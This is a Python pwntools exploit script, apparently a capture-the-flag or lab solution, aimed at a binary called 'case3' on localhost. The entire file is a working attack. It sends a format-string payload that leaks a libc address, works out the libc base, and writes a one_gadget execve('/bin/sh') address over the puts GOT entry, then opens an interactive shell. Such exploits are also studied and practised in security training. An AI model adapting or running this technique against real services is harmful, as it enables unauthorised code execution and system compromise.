from pwn import *
import re
import sys

_puts_got = 0x404018
_foo_addr = 0x401152

leak_libc_offet = 0x026BBB

# %269$p - __libc_start_main+235

# 0xe664b execve("/bin/sh", rsp+0x60, environ)
# constraints:
#   [rsp+0x60] == NULL


if __name__ == "__main__":

	#p = process( "./case3" )
	p = remote( '127.0.0.1', 33047 )
	#gdb.attach( p, "b *foo+106" )

	payload = '%269$16p' # leak __libc_start_main+235
	payload += '%66c%17$hhn' 
	payload += '%191c%18$hhn'
	payload += '%47c%19$hhn'
	payload += '%192c%20$hhn'
	payload += '%21$hhn' 
	payload += '%22$hhn'
	payload += '%23$hhn'
	payload += '%24$hhn______' 

	payload += p64( _puts_got )
	payload += p64( _puts_got + 1 )
	payload += p64( _puts_got + 2 )
	payload += p64( _puts_got + 3 )
	payload += p64( _puts_got + 4 )
	payload += p64( _puts_got + 5 )
	payload += p64( _puts_got + 6 )
	payload += p64( _puts_got + 7 )


	p.recvuntil( ": " )
	p.send( payload + '\n' )

	data = p.recvuntil( ": " )
	data += p.recvuntil( ": " ) 
	
	try:
		leak = int( re.findall( "0x[a-f0-9]{12}", data )[ 0 ], 16 )
	except:
		print "{-} Could not get leak!"
		p.close()
		sys.exit( -1 )

	libc_base = leak - leak_libc_offet
	one_gadget_addr = libc_base + 0xe664b

	print "leak = 0x%x" % leak
	print "libc_base = 0x%x" % libc_base

	context.clear(arch = 'amd64')

	format_string = fmtstr_payload( 19, 
		{_puts_got: one_gadget_addr}, 
		numbwritten=-64 
	)

	format_string = format_string[64:]
	format_string += 'a' * (8 - (len(format_string) % 8))

	payload = format_string

	payload += p64( 0x0 )
	payload += p64( 0x0 )
	payload += p64( _puts_got )
	payload += p64( _puts_got + 1 )
	payload += p64( _puts_got + 2 )
	payload += p64( _puts_got + 3 )
	payload += p64( _puts_got + 4 )
	payload += p64( _puts_got + 5 )
	payload += p64( _puts_got + 6 )
	payload += p64( _puts_got + 7 )

	payload += '\x00' * 200

	# get shell
	p.send( payload + '\n' )
	p.interactive()
	
	# exit
	p.close()
